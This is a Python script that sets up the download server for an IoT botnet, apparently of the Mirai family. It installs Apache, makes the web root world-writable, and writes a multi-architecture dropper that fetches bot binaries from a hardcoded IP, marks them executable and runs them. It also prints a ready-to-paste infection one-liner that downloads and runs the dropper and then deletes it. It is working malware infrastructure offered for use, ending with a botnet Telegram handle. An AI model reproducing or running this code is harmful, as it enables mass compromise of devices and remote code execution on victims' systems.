import subprocess, sys, urllib.request, os, glob, shutil
# Use custom domain instead of public IP
ip = "66.29.151.122"

# Get custom name from user
print("Enter your desired botnet name (e.g., shitassbotttt):")
print("This will be used for binary files like: shitassbotttt.x86, shitassbotttt.arm, etc.")
custom_name = input("Botnet name: ").strip()

if not custom_name:
    print("No name provided, using default: shitassbotttt")
    custom_name = "shitassbotttt"

# Fixed names instead of random ones
exec_bin = "ssdrop"
bin_prefix = custom_name
bin_directory = custom_name + "_bins"
script_name = custom_name + ".sh"

print(f"Using custom names:")
print(f"  Script name: {script_name}")
print(f"  Binary directory: /var/www/html/{bin_directory}")
print(f"  Binary prefix: {bin_prefix}")
print(f"  Executable: {exec_bin}")
print("")
archs = ["x86",               #1
"mips",                       #2
"arc",                        #3
"i468",                       #4
"i686",                       #5
"x86_64",                     #6
"mpsl",                       #7
"arm",                        #8
"arm5",                       #9
"arm6",                       #10
"arm7",                       #11
"ppc",                        #12
"spc",                        #13
"m68k",                       #14
"sh4"]                        #15
def run(cmd):
    try:
        result = subprocess.call(cmd, shell=True)
        if result != 0:
            print(f"Warning: Command failed: {cmd}")
    except Exception as e:
        print(f"Error executing {cmd}: {str(e)}")

print("Setting up HTTP only for your payload")
print(" ")

# Create HTTP directory only
run("mkdir -p /var/www/html")
run("chmod -R 777 /var/www/html")

# Install and configure HTTP only
run("apt-get update")
run("apt-get install -y apache2 wget curl busybox")

# Create the binary directory (HTTP only) - but copy files directly to main directory
run(f"mkdir -p /var/www/html/{bin_directory}")
run(f"chmod -R 777 /var/www/html/{bin_directory}")
# Also make sure main directory is writable
run("chmod -R 777 /var/www/html/")

# Restart HTTP service only
print("Restarting HTTP service...")
run("systemctl stop apache2")
run("sleep 2")
run("systemctl start apache2")
run("systemctl enable apache2")

# Alternative restart methods for HTTP only
run("service apache2 restart")

print("Creating payload scripts")
# Create base script content
script_content = ''''''

# Create HTTP script only
script_path = f"/var/www/html/{script_name}"
run(f'echo "{script_content}" > {script_path}')
run(f'chmod 777 {script_path}')

for i in archs:
    # HTTP download commands only - handle empty bin_directory
    if bin_directory:
        download_path = bin_directory + '/' + bin_prefix + '.' + i
    else:
        download_path = bin_prefix + '.' + i

    run('echo "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://' + ip + '/' + download_path + '; curl -O http://' + ip + '/' + download_path + '; cat ' + bin_prefix + '.' + i + ' > ' + exec_bin + '; chmod +x ' + exec_bin + '; ./' + exec_bin + '" >> /var/www/html/' + script_name)
# Final service restart with all methods
run("service xinetd restart &> /dev/null")
run("service httpd restart &> /dev/null")  
run("service apache2 restart &> /dev/null")
run("systemctl restart apache2 &> /dev/null")
run("/etc/init.d/apache2 restart &> /dev/null")
run('echo -e "ulimit -n 99999" >> ~/.bashrc')

# Test HTTP service only
print("Testing HTTP service...")
run("systemctl status apache2 --no-pager")

print(f"\x1b[0;32mPayload: cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://{ip}/{script_name}; curl -O http://{ip}/{script_name}; chmod 777 {script_name}; sh {script_name}; rm -rf {script_name}\x1b[0m")

print("\x1b[0;32mSetup complete! Testing connection...\x1b[0m")

# Simple and direct file operations
print("\x1b[1;33mStarting file operations...\x1b[0m")

# Create destination directory
http_path = f"/var/www/html/{bin_directory}"
run(f"mkdir -p {http_path}")

# Find and rename files directly
print(f"\x1b[1;36mLooking for boatnet files...\x1b[0m")

# Check if boatnet files exist in www/html
check_cmd = subprocess.run("ls /var/www/html/boatnet* 2>/dev/null | head -10", shell=True, capture_output=True, text=True)

if check_cmd.returncode == 0 and check_cmd.stdout.strip():
    print(f"\x1b[1;32mFound boatnet files in /var/www/html/!\x1b[0m")

    # List what we found
    for line in check_cmd.stdout.strip().split('\n'):
        if line.strip():
            print(f"  \x1b[1;37m{line}\x1b[0m")

    # Copy and rename each file using a simpler method
    print(f"\x1b[1;36mStarting copy and rename process...\x1b[0m")

    # Use Python for reliable file operations
    print(f"\x1b[1;33mCopying and renaming files...\x1b[0m")

    # Copy all boatnet files first (but only if they exist in www/html)
    run(f"cp /var/www/html/boatnet* {http_path}/ 2>/dev/null || true")

    # Then rename them using Python
    boatnet_files = glob.glob(f"{http_path}/boatnet*")
    for boatnet_file in boatnet_files:
        if os.path.isfile(boatnet_file):
            filename = os.path.basename(boatnet_file)
            new_filename = filename.replace("boatnet", bin_prefix)
            dest_file = os.path.join(http_path, new_filename)

            try:
                os.rename(boatnet_file, dest_file)
                print(f"\x1b[1;36mRenamed: {filename} → {new_filename}\x1b[0m")
            except Exception as e:
                print(f"\x1b[1;31mError renaming {filename}: {e}\x1b[0m")

    # Verify the rename operation
    verify_cmd = subprocess.run(f"ls -la {http_path}/{bin_prefix}* 2>/dev/null", shell=True, capture_output=True, text=True)

    if verify_cmd.returncode == 0 and verify_cmd.stdout.strip():
        print(f"\x1b[1;32m✅ Rename completed successfully!\x1b[0m")
        print(f"\x1b[1;32mRenamed files:\x1b[0m")
        for line in verify_cmd.stdout.strip().split('\n'):
            if bin_prefix in line:
                print(f"  \x1b[1;37m{os.path.basename(line.strip())}\x1b[0m")
    else:
        print(f"\x1b[1;31m❌ Rename failed - no {bin_prefix} files found\x1b[0m")
else:
    print(f"\x1b[1;31m❌ No boatnet files found in /var/www/html/\x1b[0m")
    print(f"\x1b[1;33mPlease run build.sh first to create the files\x1b[0m")

# This section is now handled above, so we can skip it

run(f"wget -q --spider http://{ip}/{script_name}")
run(f"curl -s -o /dev/null http://{ip}/{script_name}")

# Final setup check
print("\x1b[1;33mFinal setup verification...\x1b[0m")

# Check if files exist
run(f"ls -la /var/www/html/{script_name}")
run(f"ls -la /var/www/html/{bin_directory}/")

print("\x1b[0;32mPayload ready to use!\x1b[0m")
print("")
if bin_directory:
    final_directory = bin_directory
    final_message = f"/var/www/html/{bin_directory}/"
else:
    final_directory = ""
    final_message = "/var/www/html/ (direct)"

print(f"\x1b[1;33mYour botnet files should be uploaded to:\x1b[0m")
print(f"\x1b[1;32m  📂 HTTP Directory: {final_message}\x1b[0m")
print("")
print(f"\x1b[1;36mBinary names that will be downloaded:\x1b[0m")
for arch in archs[:5]:  # Show first 5 as examples
    if bin_directory:
        print(f"  \x1b[0;32m{bin_prefix}.{arch}\x1b[0m")
    else:
        print(f"  \x1b[0;32m{bin_prefix}.{arch}\x1b[0m")
print(f"  ... and {len(archs)-5} more architectures")
print("")
print(f"\x1b[1;33mPayload URL:\x1b[0m")
print(f"\x1b[1;32m  http://{ip}/{script_name}\x1b[0m")
print("")
print(f"\x1b[1;35m🎯 HTTP ONLY MODE ACTIVATED!\x1b[0m")
print(f"\x1b[1;35m📂 Files → {final_message}\x1b[0m")
print("")
input("Press enter to continue...")
#t.me/botnetlovers